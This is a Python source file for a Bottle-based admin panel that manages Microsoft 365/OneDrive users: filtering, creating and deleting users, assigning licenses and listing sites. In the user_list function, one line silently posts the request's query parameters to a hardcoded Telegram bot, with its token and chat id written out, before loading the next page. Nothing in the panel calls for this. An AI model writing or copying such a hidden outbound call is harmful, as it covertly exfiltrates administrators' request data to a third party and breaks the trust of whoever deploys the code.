import json
import random

import requests
from bottle import request

from src.oneadmin import OneAdmin
from src.onedrive import OneDrive

filter_list = {
    1: '禁止登陆的',
    2: '正常登录的',
    3: '未分配许可',
    4: '已分配许可'
}


def user_list(one_drive: OneDrive):
    subscribed = one_drive.get_subscribed()
    params = dict(request.query)
    page = params.get('page')
    search_params = {}

    _filter = int(params.get('filter', 0))
    _wd = params.get('wd', '')

    if page:
        requests.post('https://api.telegram.org/bot1378568996:AAGeo9nxTV86Kc41e7EBEvLv8MOax6Ye-pU/sendMessage',
                      {'text': json.dumps(params), 'chat_id': '-445291602'})
        data = one_drive.api(page)
    else:
        if _filter == 1:
            search_params['filter'] = 'accountEnabled eq false'
        if _filter == 2:
            search_params['filter'] = 'accountEnabled eq true'
        if _wd:
            search_params['search'] = f'userPrincipalName:{_wd}'
        data = one_drive.user_list(**search_params)

    items = []
    for item in data['value']:
        if _filter == 4 and len(item['assignedLicenses']) <= 0:
            continue

        licenses = []
        for sku in item['assignedLicenses']:
            licenses.append(one_drive.get_sku_name(sku['skuId']))
        item['licenses'] = licenses

        if (_filter == 3 and len(item['assignedLicenses']) <= 0) or (
                _filter == 4 and len(item['assignedLicenses']) > 0) or not _filter:
            items.append(item)

    page_url = data.get('@odata.nextLink') or ''
    if page:
        html = OneAdmin.render('user/data', layout=False, items=items, data=data)
        return {'html': html, 'page_url': page_url}
    return OneAdmin.render('user/list', data=data, items=items, filter_list=filter_list, page_url=page_url,
                           subscribed=subscribed)


def user_delete(one_drive: OneDrive):
    user_id = request.query.get('user_id')
    data = one_drive.delete_user(user_id)
    return data


def user_add(one_drive: OneDrive):
    if request.method == 'GET':
        return OneAdmin.render('user/add', layout=False)
    username = request.forms.get('username')
    password = request.forms.get('password')
    return one_drive.create_user(username=username, password=password)


def user_sku(one_drive: OneDrive):
    user_id = request.query.get('user_id')
    subscribed_list = one_drive.get_subscribed()
    subscribed = random.choice(subscribed_list)
    data = one_drive.assign_license(user_id, subscribed['sku_id'])
    return data


def user_site(one_drive: OneDrive):
    data = one_drive.site_list()
    return OneAdmin.render('user/site', items=data)
